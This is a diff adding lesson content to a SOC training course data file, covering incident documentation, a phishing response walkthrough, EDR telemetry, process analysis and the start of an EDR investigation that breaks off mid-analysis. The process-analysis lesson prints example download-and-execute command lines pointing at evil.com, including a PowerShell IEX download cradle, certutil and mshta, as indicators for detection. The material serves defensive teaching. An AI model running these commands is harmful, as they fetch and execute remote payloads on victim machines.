+        "Create a containment log for one scenario",
+        "Identify potential business impact of your containment choices"
+      ]
+    }
+  },
+  {
+    id: "7.4",
+    courseId: "soc-fundamentals",
+    title: "Incident Documentation",
+    content: `
+# Incident Documentation
+
+**Excellent documentation** is the backbone of effective incident response. Good notes enable continuity, legal defensibility, and organizational learning.
+
+## Why Documentation Matters
+
+- **Continuity** - Others can pick up where you left off
+- **Legal/Compliance** - May be needed for legal proceedings
+- **Metrics** - Enable measurement and improvement
+- **Learning** - Support post-incident reviews
+- **Communication** - Keep stakeholders informed
+
+## The Incident Ticket
+
+Every incident needs a ticket. Key fields:
+
+\`\`\`
+INCIDENT TICKET STRUCTURE
+
+┌─────────────────────────────────────────────────────────────┐
+│ TICKET HEADER                                               │
+├─────────────────────────────────────────────────────────────┤
+│ Ticket ID: INC-2024-0142                                    │
+│ Title: Emotet Malware - Marketing Department                │
+│ Severity: HIGH (2)                                          │
+│ Status: Containment                                         │
+│ Assigned: SOC Team                                          │
+│ Created: 2024-01-15 14:22 UTC                               │
+│ Last Updated: 2024-01-15 16:45 UTC                          │
+└─────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────┐
+│ INCIDENT DETAILS                                            │
+├─────────────────────────────────────────────────────────────┤
+│ Category: Malware                                           │
+│ Subcategory: Emotet/Banking Trojan                          │
+│ Attack Vector: Email Attachment (Word macro)                │
+│ Affected Systems: MKTG-PC-012, MKTG-PC-017                  │
+│ Affected Users: jsmith@company.com, mwilson@company.com     │
+│ Data Impacted: TBD - under investigation                    │
+│ Business Impact: Marketing team offline                     │
+└─────────────────────────────────────────────────────────────┘
+\`\`\`
+
+## Timeline Documentation
+
+Record every action with timestamps:
+
+\`\`\`
+INCIDENT TIMELINE
+
+[2024-01-15 13:45 UTC] - Initial Alert
+EDR alert: Suspicious PowerShell execution on MKTG-PC-012
+Alert ID: CRW-4521, Severity: High
+
+[2024-01-15 13:52 UTC] - Triage Initiated
+Analyst J. Chen began investigation
+Initial finding: PowerShell downloading payload from external URL
+
+[2024-01-15 14:05 UTC] - Malware Identified
+VirusTotal analysis: Emotet variant
+Hash: abc123def456...
+First seen: 2024-01-10
+
+[2024-01-15 14:15 UTC] - Second System Identified
+Review shows MKTG-PC-017 also compromised
+Same malware, same timeframe
+
+[2024-01-15 14:22 UTC] - Incident Declared
+Escalated to Severity 2 Incident
+IR Lead notified, ticket created
+
+[2024-01-15 14:30 UTC] - Containment Initiated
+Both systems isolated via EDR
+Network connection blocked at firewall
+
+[2024-01-15 15:00 UTC] - Email Analysis
+Phishing email identified
+Subject: "Invoice Q4-2024"
+Sent to 23 users, 2 clicked
+\`\`\`
+
+## Evidence Collection Notes
+
+Document what you collected and where:
+
+\`\`\`
+EVIDENCE LOG
+
+┌────────┬──────────────────────────────────────────────────────┐
+│ ID     │ E001                                                 │
+├────────┼──────────────────────────────────────────────────────┤
+│ Type   │ Memory Dump                                          │
+│ Source │ MKTG-PC-012                                          │
+│ Hash   │ SHA256: f4d2a9c8...                                  │
+│ Time   │ 2024-01-15 14:35 UTC                                 │
+│ Method │ FTK Imager                                           │
+│ Chain  │ Collected by J. Chen, stored at \\forensics\\INC142   │
+└────────┴──────────────────────────────────────────────────────┘
+
+┌────────┬──────────────────────────────────────────────────────┐
+│ ID     │ E002                                                 │
+├────────┼──────────────────────────────────────────────────────┤
+│ Type   │ Malicious Email                                      │
+│ Source │ Exchange Server                                      │
+│ Hash   │ SHA256: a8b7c6d5...                                  │
+│ Time   │ 2024-01-15 15:12 UTC                                 │
+│ Method │ Email export (EML format)                            │
+│ Chain  │ Collected by SOC, stored at \\forensics\\INC142       │
+└────────┴──────────────────────────────────────────────────────┘
+\`\`\`
+
+## Communication Templates
+
+### Initial Notification
+
+\`\`\`
+SUBJECT: [Severity 2] Security Incident - Marketing Department
+
+Status: ACTIVE
+Ticket: INC-2024-0142
+
+Summary:
+Malware infection detected on two Marketing workstations. 
+Initial analysis indicates Emotet banking trojan delivered via 
+phishing email.
+
+Current Actions:
+• Affected systems isolated from network
+• Investigation ongoing
+• Email team blocking malicious sender
+
+Impact:
+• Two Marketing users offline
+• No confirmed data loss at this time
+
+Next Update: Within 2 hours
+Contact: SOC Team - soc@company.com
+\`\`\`
+
+### Status Update
+
+\`\`\`
+SUBJECT: [UPDATE] INC-2024-0142 - Containment Complete
+
+Status: ERADICATION IN PROGRESS
+Last Update: 2 hours ago
+
+Progress:
+✓ All affected systems isolated (2 workstations)
+✓ Malware identified and analyzed
+✓ Phishing email removed from all mailboxes
+✓ C2 domains blocked at firewall
+→ Currently reimaging affected systems
+→ User credential reset in progress
+
+Remaining Work:
+• Complete system reimaging (~2 hours)
+• User awareness communication
+• Update detection rules
+
+Estimated Resolution: 4 hours
+
+Next Update: Upon resolution or significant change
+\`\`\`
+
+## Best Practices
+
+### The 5 W's + H
+
+For every entry, capture:
+- **Who** - Actor/analyst involved
+- **What** - Action taken or observed
+- **When** - Timestamp (UTC)
+- **Where** - System/location
+- **Why** - Reasoning for action
+- **How** - Method/tools used
+
+### Documentation Don'ts
+
+\`\`\`
+✗ Don't use vague language ("I saw something weird")
+✗ Don't forget timestamps
+✗ Don't editorialize or speculate without marking it
+✗ Don't document passwords or sensitive data in clear text
+✗ Don't wait until the end to document
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Documentation enables continuity, legal defense, and learning",
+      "Every incident needs a ticket with consistent fields",
+      "Maintain detailed timelines with UTC timestamps",
+      "Log all evidence with chain of custody information",
+      "Use the 5 W's + H for comprehensive entries"
+    ],
+    practicalExercise: {
+      title: "Incident Documentation Practice",
+      description: "Create complete documentation for a sample incident.",
+      steps: [
+        "Fill out an incident ticket template",
+        "Build a timeline with at least 10 entries",
+        "Create an evidence log entry",
+        "Draft an initial notification email",
+        "Write a status update for stakeholders"
+      ]
+    }
+  },
+  {
+    id: "7.5",
+    courseId: "soc-fundamentals",
+    title: "Hands-On: Phishing Incident Response",
+    content: `
+# Hands-On: Phishing Incident Response
+
+Let's walk through a complete phishing incident from detection to resolution. This exercise simulates real SOC work.
+
+## Scenario
+
+\`\`\`
+ALERT RECEIVED
+
+Source: Email Security Gateway
+Time: 2024-01-15 09:22:15 UTC
+Alert: User clicked malicious URL in email
+Details:
+- User: sarah.jones@company.com
+- Subject: "Urgent: Password Expiry Notice"
+- Sender: it-support@c0mpany.com (note the zero)
+- Link Clicked: https://c0mpany-auth.evil.site/reset
+\`\`\`
+
+## Phase 1: Detection & Initial Analysis
+
+### Email Analysis
+
+\`\`\`
+FROM: it-support@c0mpany.com
+TO: sarah.jones@company.com
+DATE: 2024-01-15 09:15:22 UTC
+SUBJECT: Urgent: Password Expiry Notice
+
+--- BEGIN EMAIL BODY ---
+Dear Employee,
+
+Your password will expire in 24 hours. Click below to reset:
+
+[Reset Password Now]
+https://c0mpany-auth.evil.site/reset?id=a8b7c6...
+
+IT Support Team
+
+--- END EMAIL BODY ---
+\`\`\`
+
+**Red Flags Identified:**
+\`\`\`
+□ Sender domain uses "0" instead of "o" (c0mpany vs company)
+□ Urgency tactics ("will expire in 24 hours")
+□ Generic greeting ("Dear Employee")
+□ External link disguised as internal
+□ No SPF/DKIM authentication
+\`\`\`
+
+### User Contact
+
+\`\`\`
+PHONE CALL TO USER (9:35 AM)
+
+Analyst: "Hi Sarah, this is the Security team. We noticed 
+         you clicked a link in an email about password reset.
+         Did you enter any credentials?"
+
+Sarah: "Yes, it asked for my password and I typed it in.
+        It said there was an error and to try again later."
+
+Analyst: "Thank you for being honest. I'll need to secure 
+         your account and ask you some questions. Please don't
+         access any sensitive systems until we're done."
+\`\`\`
+
+**Critical Finding:** User entered credentials on phishing page!
+
+## Phase 2: Containment
+
+### Immediate Actions Taken
+
+\`\`\`
+[09:38 UTC] - Password Reset
+Action: Reset Sarah's password in Active Directory
+Result: Previous password invalidated
+
+[09:40 UTC] - Session Termination
+Action: Terminated all active sessions for sarah.jones
+- O365 sessions cleared
+- VPN sessions terminated
+- SSO tokens revoked
+
+[09:42 UTC] - Block Malicious Infrastructure
+Action: Added to firewall blocklist
+- Domain: c0mpany-auth.evil.site
+- IP: 185.234.218.45
+
+[09:45 UTC] - Email Removal
+Action: Searched and removed email from all mailboxes
+Result: Found in 47 mailboxes, removed from all
+Clicked by: 3 users total
+\`\`\`
+
+### Scope Assessment
+
+\`\`\`
+AFFECTED USERS ANALYSIS
+
+User 1: sarah.jones@company.com
+- Clicked link: YES
+- Entered credentials: YES
+- Status: COMPROMISED → Reset complete
+
+User 2: mike.wilson@company.com  
+- Clicked link: YES
+- Entered credentials: NO (closed page)
+- Status: No action needed
+
+User 3: lisa.chen@company.com
+- Clicked link: YES
+- Entered credentials: Unknown
+- Status: INVESTIGATING → Calling now
+\`\`\`
+
+## Phase 3: Investigation
+
+### Account Activity Review
+
+\`\`\`
+SARAH.JONES ACCOUNT ACTIVITY (Last 24 hours)
+
+Normal Activity (Before 9:22 UTC):
+- 08:00 - Logged into workstation
+- 08:05 - Accessed O365, normal email use
+- 08:30 - Joined Teams meeting
+
+Suspicious Activity (After credential entry):
+- 09:25 - Login from unusual IP (91.109.190.68) → ATTACKER
+- 09:26 - Email forwarding rule created
+- 09:27 - Accessed SharePoint finance folder
+- 09:28 - Downloaded 3 Excel files
+
+Post-Containment:
+- 09:38 - Password changed (by SOC)
+- 09:40 - Sessions terminated
+- No further access attempts
+\`\`\`
+
+### Malicious Actions Detected
+
+\`\`\`
+1. EMAIL FORWARDING RULE
+   Rule: "Auto-Forward"
+   Condition: All emails
+   Forward to: external@attacker.com
+   Action: DELETED
+
+2. FILE ACCESS
+   Files accessed from attacker IP:
+   - Q4-Financial-Report.xlsx
+   - Budget-2024.xlsx
+   - Employee-Salary-Data.xlsx
+   
+   Status: POTENTIAL DATA BREACH
+   Escalation: Required - sensitive data accessed
+\`\`\`
+
+## Phase 4: Eradication & Recovery
+
+### Cleanup Actions
+
+\`\`\`
+□ Malicious forwarding rule removed
+□ Password reset completed
+□ MFA enforced on account
+□ User briefed on incident
+□ Workstation scanned (clean)
+\`\`\`
+
+### Recovery
+
+\`\`\`
+□ User provided new temporary password
+□ MFA enrollment completed
+□ User returned to normal duties at 11:30 UTC
+□ Monitoring period: 30 days
+\`\`\`
+
+## Phase 5: Post-Incident
+
+### Incident Summary
+
+\`\`\`
+INCIDENT REPORT: INC-2024-0087
+
+Duration: 9:22 - 11:30 UTC (2 hours, 8 minutes)
+Severity: HIGH (2)
+Category: Phishing → Credential Theft → Data Access
+
+Impact:
+- 1 user account compromised
+- 3 financial files accessed by attacker
+- Email forwarding rule created
+
+Root Cause:
+- Convincing phishing email bypassed email security
+- User did not recognize typosquatted domain
+- No MFA on affected account
+
+Actions Taken:
+- Credentials reset
+- Sessions terminated  
+- Malicious infrastructure blocked
+- Attacker's email forward rule removed
+- MFA enforced
+
+Recommendations:
+1. Enable MFA for all users (not just some)
+2. Improve email filtering for typosquatting
+3. Conduct phishing awareness training
+4. Review accessed files for data classification
+5. Consider data breach notification requirements
+\`\`\`
+
+### Lessons Learned
+
+**What Went Well:**
+- Fast detection from email gateway
+- Quick containment actions
+- Good user cooperation
+
+**What Could Improve:**
+- MFA should have been enabled already
+- User training on recognizing phishing
+- Faster escalation on data access
+
+**Action Items:**
+| Action | Owner | Due Date |
+|--------|-------|----------|
+| MFA rollout | IT | 2 weeks |
+| Phishing training | HR/Sec | 1 week |
+| Email filter tuning | Email Team | 3 days |
+| Data breach assessment | Legal | 1 day |
+    `,
+    keyTakeaways: [
+      "Phishing response requires quick credential reset and session termination",
+      "Always check for mail forwarding rules set by attackers",
+      "Document attacker activity timeline for scope assessment",
+      "Data access by attackers may trigger breach notification requirements",
+      "Post-incident improvements prevent similar attacks"
+    ],
+    practicalExercise: {
+      title: "Complete Phishing IR Exercise",
+      description: "Work through a phishing incident using the provided scenario.",
+      steps: [
+        "Analyze the phishing email and list all indicators",
+        "Create a containment action checklist",
+        "Document a timeline of the incident",
+        "Draft a user notification message",
+        "Write three recommendations for prevention"
+      ]
+    }
+  },
+
+  // =========================================
+  // MODULE 8: ENDPOINT DETECTION & RESPONSE
+  // =========================================
+  {
+    id: "8.1",
+    courseId: "soc-fundamentals",
+    title: "What is EDR?",
+    content: `
+# What is EDR?
+
+**Endpoint Detection and Response (EDR)** is a security technology that continuously monitors endpoints to detect, investigate, and respond to cyber threats.
+
+## Evolution of Endpoint Security
+
+\`\`\`
+Traditional Antivirus              EDR
+        │                           │
+  Signature-based            Behavioral analysis
+  Periodic scans             Real-time monitoring
+  Known threats only         Unknown threat detection
+  Limited visibility         Full telemetry
+  Manual response            Automated response
+\`\`\`
+
+## Core EDR Capabilities
+
+### 1. Continuous Monitoring
+
+EDR agents run 24/7, watching:
+- Process execution
+- File system changes
+- Registry modifications
+- Network connections
+- Memory operations
+- User activities
+
+### 2. Detection
+
+\`\`\`
+DETECTION METHODS
+
+┌─────────────────────────────────────────────────────────┐
+│  Signature-Based                                        │
+│  └─ Known malware hashes, patterns                      │
+├─────────────────────────────────────────────────────────┤
+│  Behavioral Analysis                                    │
+│  └─ Suspicious behavior patterns (even for new threats) │
+├─────────────────────────────────────────────────────────┤
+│  Machine Learning                                       │
+│  └─ Anomaly detection, classification models            │
+├─────────────────────────────────────────────────────────┤
+│  Threat Intelligence                                    │
+│  └─ IOCs from global threat feeds                       │
+└─────────────────────────────────────────────────────────┘
+\`\`\`
+
+### 3. Investigation
+
+EDR provides rich data for investigation:
+- Full process tree visualization
+- File and registry timeline
+- Network connection history
+- User session context
+- Related alerts and incidents
+
+### 4. Response
+
+Automated and manual response options:
+
+| Capability | Description |
+|------------|-------------|
+| Isolate | Cut off network access |
+| Kill Process | Terminate malicious processes |
+| Quarantine | Isolate suspicious files |
+| Remediate | Remove malware and artifacts |
+| Rollback | Restore to previous state |
+
+## EDR Architecture
+
+\`\`\`
+                    ┌─────────────────────────────────┐
+                    │     EDR Management Console      │
+                    │  (Cloud or On-Premise)          │
+                    └─────────────┬───────────────────┘
+                                  │
+              ┌───────────────────┼───────────────────┐
+              │                   │                   │
+              ↓                   ↓                   ↓
+    ┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐
+    │   EDR Agent     │ │   EDR Agent     │ │   EDR Agent     │
+    │   Workstation   │ │     Server      │ │     Laptop      │
+    └─────────────────┘ └─────────────────┘ └─────────────────┘
+           │                   │                   │
+           ↓                   ↓                   ↓
+    ┌─────────────────────────────────────────────────────────┐
+    │              Telemetry Data Collection                   │
+    │  • Processes  • Files  • Registry  • Network  • Memory  │
+    └─────────────────────────────────────────────────────────┘
+\`\`\`
+
+## Popular EDR Solutions
+
+### Enterprise Solutions
+
+| Vendor | Product | Key Strength |
+|--------|---------|--------------|
+| CrowdStrike | Falcon | Cloud-native, threat intel |
+| Microsoft | Defender for Endpoint | Windows integration |
+| SentinelOne | Singularity | AI-powered automation |
+| Carbon Black | CB Defense | Process visibility |
+| Palo Alto | Cortex XDR | Multi-vector detection |
+
+### What SOC Analysts Need to Know
+
+**Console Navigation:**
+- Dashboard and alert queue
+- Host search and investigation
+- Process tree analysis
+- Response action execution
+
+**Key Skills:**
+- Understanding alert severity and confidence
+- Process tree interpretation
+- File and registry analysis
+- Network connection review
+- Response action selection
+
+## EDR vs Traditional AV
+
+\`\`\`
+Feature           │ Antivirus │ EDR
+──────────────────┼───────────┼──────────
+Detection Method  │ Signatures│ Behavioral + Signatures
+Visibility        │ Limited   │ Full telemetry
+Investigation     │ Basic     │ Rich context
+Response          │ Block only│ Isolate, remediate, rollback
+Threat Hunting    │ No        │ Yes
+Cloud Analysis    │ No        │ Yes
+Cost              │ Low       │ Higher
+\`\`\`
+
+## Why EDR Matters for SOC
+
+1. **Rich Telemetry** - See exactly what happened
+2. **Fast Response** - Contain threats in seconds
+3. **Investigation Power** - Drill down into details
+4. **Threat Hunting** - Proactively search for threats
+5. **Automation** - Reduce manual workload
+    `,
+    keyTakeaways: [
+      "EDR provides continuous endpoint monitoring and behavioral detection",
+      "Core capabilities: monitoring, detection, investigation, and response",
+      "EDR offers rich telemetry including process, file, registry, and network data",
+      "Response actions include isolation, process termination, and remediation",
+      "SOC analysts use EDR for alert investigation and threat containment"
+    ],
+    additionalResources: [
+      { title: "CrowdStrike University", type: "documentation", url: "https://www.crowdstrike.com" },
+      { title: "Microsoft Defender for Endpoint Docs", type: "documentation", url: "https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/" }
+    ]
+  },
+  {
+    id: "8.2",
+    courseId: "soc-fundamentals",
+    title: "EDR Alerts & Telemetry",
+    content: `
+# EDR Alerts & Telemetry
+
+Understanding EDR alerts and the telemetry behind them is crucial for effective investigation.
+
+## Anatomy of an EDR Alert
+
+\`\`\`
+┌─────────────────────────────────────────────────────────────────┐
+│ ALERT: Suspicious PowerShell Execution                         │
+├─────────────────────────────────────────────────────────────────┤
+│ Severity: HIGH      Confidence: 90%      Category: Execution   │
+├─────────────────────────────────────────────────────────────────┤
+│ Hostname: FINANCE-PC-08                                         │
+│ Username: jsmith                                                 │
+│ Timestamp: 2024-01-15 14:22:35 UTC                              │
+├─────────────────────────────────────────────────────────────────┤
+│ Detection: PowerShell with encoded command spawned from        │
+│           suspicious parent process (WINWORD.EXE)              │
+├─────────────────────────────────────────────────────────────────┤
+│ Process: powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0A...      │
+│ Parent:  WINWORD.EXE (Microsoft Word)                          │
+│ File:    C:\\Users\\jsmith\\Downloads\\Invoice.doc              │
+├─────────────────────────────────────────────────────────────────┤
+│ MITRE ATT&CK: T1059.001 - PowerShell                           │
+│              T1566.001 - Spear Phishing Attachment             │
+└─────────────────────────────────────────────────────────────────┘
+\`\`\`
+
+## Alert Severity Levels
+
+| Level | Description | Typical Response |
+|-------|-------------|------------------|
+| Critical | Active attack, high confidence | Immediate action |
+| High | Likely malicious, investigation needed | Priority review |
+| Medium | Suspicious, may be benign | Same-day triage |
+| Low | Anomalous but likely benign | Batch review |
+| Informational | Context for other alerts | Reference only |
+
+## Types of EDR Telemetry
+
+### Process Telemetry
+
+\`\`\`
+PROCESS EVENT
+
+Event Type: Process Creation
+Timestamp: 2024-01-15 14:22:35.421 UTC
+
+Process Details:
+├── PID: 4892
+├── Name: powershell.exe
+├── Path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+├── Command Line: powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0A...
+├── Hash (SHA256): a5d2f8...
+├── Signature: Signed by Microsoft
+└── Integrity Level: Medium
+
+Parent Process:
+├── PID: 2156
+├── Name: WINWORD.EXE
+├── Path: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
+└── User: DOMAIN\\jsmith
+\`\`\`
+
+### File Telemetry
+
+\`\`\`
+FILE EVENTS
+
+[WRITE] 14:22:34.102 UTC
+Path: C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.dll
+Size: 245,760 bytes
+Hash: b7c8d9e0f1...
+Written by: powershell.exe (PID 4892)
+
+[EXECUTE] 14:22:35.891 UTC
+Path: C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.dll
+Loaded by: rundll32.exe (PID 5124)
+Export: DllRegisterServer
+\`\`\`
+
+### Network Telemetry
+
+\`\`\`
+NETWORK CONNECTIONS
+
+[OUTBOUND] 14:22:36.156 UTC
+Process: rundll32.exe (PID 5124)
+Source: 10.0.1.108:49822
+Destination: 185.234.218.45:443
+Protocol: HTTPS
+Bytes Sent: 1,024
+Bytes Received: 2,048
+Status: Established
+
+[DNS] 14:22:35.982 UTC
+Query: evil-c2-server.com
+Response: 185.234.218.45
+Requested by: payload.dll (loaded in rundll32.exe)
+\`\`\`
+
+### Registry Telemetry
+
+\`\`\`
+REGISTRY EVENTS
+
+[SETVALUE] 14:22:37.234 UTC
+Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+Value: Updater
+Data: C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.dll
+Process: rundll32.exe (PID 5124)
+
+Analysis: Persistence mechanism - runs on user login
+\`\`\`
+
+## Reading Process Trees
+
+Process trees show parent-child relationships:
+
+\`\`\`
+PROCESS TREE VISUALIZATION
+
+explorer.exe (PID 1024)
+└── outlook.exe (PID 2048)
+    └── WINWORD.EXE (PID 2156)        [!] Opened malicious doc
+        └── powershell.exe (PID 4892) [!] Encoded command
+            └── rundll32.exe (PID 5124)[!] Loaded payload
+
+SUSPICIOUS INDICATORS:
+• Office app spawning PowerShell
+• Encoded PowerShell commands
+• rundll32 executing downloaded DLL
+\`\`\`
+
+### Normal vs Suspicious Trees
+
+**Normal:**
+\`\`\`
+explorer.exe
+└── chrome.exe
+    └── chrome.exe (child processes)
+\`\`\`
+
+**Suspicious:**
+\`\`\`
+explorer.exe
+└── EXCEL.EXE
+    └── cmd.exe           [!] Why is Excel running cmd?
+        └── powershell.exe [!] PowerShell from cmd from Excel
+\`\`\`
+
+## Alert Triage with EDR
+
+### Investigation Workflow
+
+\`\`\`
+1. ALERT REVIEW
+   └─ Read alert summary and severity
+   
+2. PROCESS CONTEXT
+   └─ Examine process tree
+   └─ Check command line arguments
+   └─ Review parent process legitimacy
+
+3. FILE ANALYSIS
+   └─ Check file reputation
+   └─ Review file origin
+   └─ Examine modifications
+
+4. NETWORK CONTEXT
+   └─ Check destination IP/domain reputation
+   └─ Review connection timing
+   └─ Look for beaconing patterns
+
+5. USER CONTEXT
+   └─ Is this normal for this user?
+   └─ Recent user activity
+   └─ Login location/time
+
+6. VERDICT
+   └─ True positive → Respond
+   └─ False positive → Tune
+   └─ Needs escalation → Escalate
+\`\`\`
+    `,
+    keyTakeaways: [
+      "EDR alerts include severity, confidence, detection logic, and MITRE mapping",
+      "Key telemetry types: process, file, network, and registry events",
+      "Process trees reveal parent-child relationships and attack chains",
+      "Office applications spawning scripting engines is a major red flag",
+      "Effective triage combines process, file, network, and user context"
+    ],
+    practicalExercise: {
+      title: "EDR Alert Analysis",
+      description: "Practice analyzing EDR alerts and telemetry data.",
+      steps: [
+        "Review the sample EDR alert provided",
+        "Draw the process tree from the telemetry",
+        "Identify all suspicious indicators",
+        "Determine if the alert is a true or false positive",
+        "Document your analysis and verdict"
+      ]
+    }
+  },
+  {
+    id: "8.3",
+    courseId: "soc-fundamentals",
+    title: "Process Analysis Basics",
+    content: `
+# Process Analysis Basics
+
+Understanding process behavior is fundamental to EDR investigation. This lesson covers how to analyze processes for signs of malicious activity.
+
+## Process Fundamentals
+
+Every Windows process has key attributes:
+
+\`\`\`
+PROCESS ATTRIBUTES
+
+┌─────────────────────────────────────────────────────────────┐
+│ IDENTIFICATION                                              │
+├─────────────────────────────────────────────────────────────┤
+│ Process Name: powershell.exe                                │
+│ PID: 4892                                                   │
+│ Parent PID: 2156                                            │
+│ Session ID: 1 (user session)                                │
+└─────────────────────────────────────────────────────────────┘
+│ EXECUTION CONTEXT                                           │
+├─────────────────────────────────────────────────────────────┤
+│ User: DOMAIN\\jsmith                                         │
+│ Integrity Level: Medium                                     │
+│ Token Privileges: SeDebugPrivilege (DISABLED)               │
+│ Start Time: 2024-01-15 14:22:35 UTC                         │
+└─────────────────────────────────────────────────────────────┘
+│ FILE INFORMATION                                            │
+├─────────────────────────────────────────────────────────────┤
+│ Path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\          │
+│ Hash: SHA256 a5d2f8...                                      │
+│ Signature: Microsoft Windows                                │
+│ Compile Time: 2023-05-15                                    │
+└─────────────────────────────────────────────────────────────┘
+\`\`\`
+
+## Suspicious Process Indicators
+
+### 1. Unusual Parent-Child Relationships
+
+\`\`\`
+SUSPICIOUS SPAWNING PATTERNS
+
+Office Applications → Scripting Engines
+├── WINWORD.EXE → powershell.exe    [!]
+├── EXCEL.EXE → cmd.exe             [!]
+├── OUTLOOK.EXE → wscript.exe       [!]
+
+Browser → System Tools
+├── chrome.exe → cmd.exe            [!]
+├── firefox.exe → powershell.exe    [!]
+
+Services → Unexpected Children
+├── services.exe → cmd.exe          [!]
+├── wmiprvse.exe → powershell.exe   [!]
+\`\`\`
+
+### 2. Suspicious Command Lines
+
+**Encoded Commands:**
+\`\`\`powershell
+# Suspicious - Base64 encoded
+powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0A...
+
+# Suspicious - Download cradle
+powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')
+
+# Suspicious - Bypass flags
+powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden
+\`\`\`
+
+**Suspicious Parameters:**
+\`\`\`cmd
+# Hidden execution
+cmd.exe /c start /min
+wscript.exe //B //E:jscript
+
+# LOLBAS usage
+certutil.exe -urlcache -split -f http://evil.com/malware.exe
+mshta.exe http://evil.com/payload.hta
+\`\`\`
+
+### 3. Unusual Process Paths
+
+\`\`\`
+EXPECTED LOCATIONS
+
+powershell.exe  → C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\
+cmd.exe         → C:\\Windows\\System32\\
+svchost.exe     → C:\\Windows\\System32\\
+
+SUSPICIOUS LOCATIONS
+
+powershell.exe  → C:\\Users\\Public\\powershell.exe         [!]
+svchost.exe     → C:\\Windows\\Temp\\svchost.exe            [!]
+cmd.exe         → C:\\ProgramData\\cmd.exe                  [!]
+\`\`\`
+
+### 4. Process Masquerading
+
+Attackers disguise processes:
+
+\`\`\`
+LEGITIMATE                          MASQUERADING
+svchost.exe                        svch0st.exe (zero instead of 'o')
+services.exe                       service.exe (missing 's')
+csrss.exe                          cssrs.exe (letters swapped)
+lsass.exe                          lsasss.exe (extra 's')
+\`\`\`
+
+## Common Attack Techniques
+
+### Living Off the Land (LOLBAS)
+
+Legitimate tools used maliciously:
+
+| Tool | Malicious Use |
+|------|---------------|
+| certutil.exe | Download files |
+| mshta.exe | Execute HTA files |
+| regsvr32.exe | Execute scripts |
+| rundll32.exe | Execute DLLs |
+| wmic.exe | Process execution |
+| bitsadmin.exe | Download files |
+
+### Process Injection
+
+Signs of process injection:
+
+\`\`\`
+INJECTION INDICATORS
+
+1. Unexpected memory allocations
+   └─ VirtualAlloc in remote process
+
+2. Suspicious thread creation
+   └─ CreateRemoteThread
+
+3. Normal process with unusual behavior
+   └─ notepad.exe making network connections
+
+4. Hollowed processes
+   └─ Process image doesn't match on-disk file
+\`\`\`
+
+## Baseline Knowledge: Normal Process Behavior
+
+### Critical Windows Processes
+
+\`\`\`
+PROCESS: svchost.exe
+Normal:
+├── Parent: services.exe ONLY
+├── Path: C:\\Windows\\System32\\svchost.exe
+├── Command: svchost.exe -k [service group]
+├── Multiple instances (normal)
+Suspicious:
+├── Parent other than services.exe
+├── Running from wrong path
+├── No -k parameter
+
+PROCESS: lsass.exe
+Normal:
+├── Parent: wininit.exe
+├── Path: C:\\Windows\\System32\\lsass.exe
+├── Single instance only
+├── High integrity level
+Suspicious:
+├── Multiple instances
+├── Wrong parent or path
+├── Credential dumping attempts
+
+PROCESS: csrss.exe
+Normal:
+├── Parent: (no parent - first process)
+├── Path: C:\\Windows\\System32\\csrss.exe
+├── Session 0 and per user session
+Suspicious:
+├── Has a visible parent
+├── Wrong path
+├── Unusual child processes
+\`\`\`
+
+## Process Analysis Checklist
+
+\`\`\`
+□ Is the process name spelled correctly?
+□ Is it running from the expected path?
+□ Is the parent process legitimate?
+□ Are the command-line arguments suspicious?
+□ Is the process signed by a trusted publisher?
+□ Is the behavior normal for this process type?
+□ Are there network connections that are unusual?
+□ Are child processes expected?
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Process analysis requires understanding normal parent-child relationships",
+      "Office apps spawning scripting engines is a critical red flag",
+      "Unusual paths and misspelled names indicate masquerading",
+      "LOLBAS techniques use legitimate tools for malicious purposes",
+      "Know the normal behavior of critical Windows processes"
+    ],
+    practicalExercise: {
+      title: "Process Tree Analysis",
+      description: "Analyze process trees to identify malicious activity.",
+      steps: [
+        "Review three sample process trees",
+        "Identify the parent-child relationship anomalies",
+        "Flag suspicious command-line arguments",
+        "Determine which processes are masquerading",
+        "Write a verdict for each process tree"
+      ]
+    }
+  },
+  {
+    id: "8.4",
+    courseId: "soc-fundamentals",
+    title: "Hands-On: EDR Investigation",
+    content: `
+# Hands-On: EDR Investigation
+
+Let's walk through a complete EDR investigation from alert to resolution.
+
+## Scenario
+
+\`\`\`
+ALERT DETAILS
+
+Alert Name: Credential Dumping Attempt Detected
+Severity: CRITICAL
+Confidence: 95%
+Timestamp: 2024-01-15 02:34:17 UTC
+Hostname: DC-PRIMARY
+Username: SYSTEM
+MITRE ATT&CK: T1003.001 - LSASS Memory Dumping
+
+Detection: Process accessed LSASS memory with suspicious pattern
+Process: rundll32.exe
+Command: rundll32.exe C:\\Windows\\Temp\\debug.dll,DllMain
+\`\`\`
+
+## Step 1: Initial Assessment
+
+### Alert Context
+
+\`\`\`
+CRITICAL FACTORS:
+☑ Domain Controller - highest value target
+☑ LSASS access - credential theft technique
+☑ Unusual DLL location (Windows\\Temp)
+☑ Running as SYSTEM - high privileges
+☑ 2:34 AM - outside business hours
+
+VERDICT: High priority, investigate immediately
+\`\`\`
+
+## Step 2: Process Tree Analysis
+
+\`\`\`
+PROCESS TREE
+
+winlogon.exe (PID 512)
+└── services.exe (PID 624)
+    └── svchost.exe -k netsvcs (PID 892)
+        └── WmiPrvSE.exe (PID 2048)          [1] WMI activity
+            └── powershell.exe (PID 3156)    [2] PS execution
+                └── cmd.exe (PID 3892)        [3] cmd child
+                    └── rundll32.exe (PID 4212)[4] LSASS access
+
+ANALYSIS:
+[1] WmiPrvSE.exe - WMI can be used for remote execution
+[2] PowerShell spawned from WMI - suspicious!
+[3] cmd.exe child - executing commands
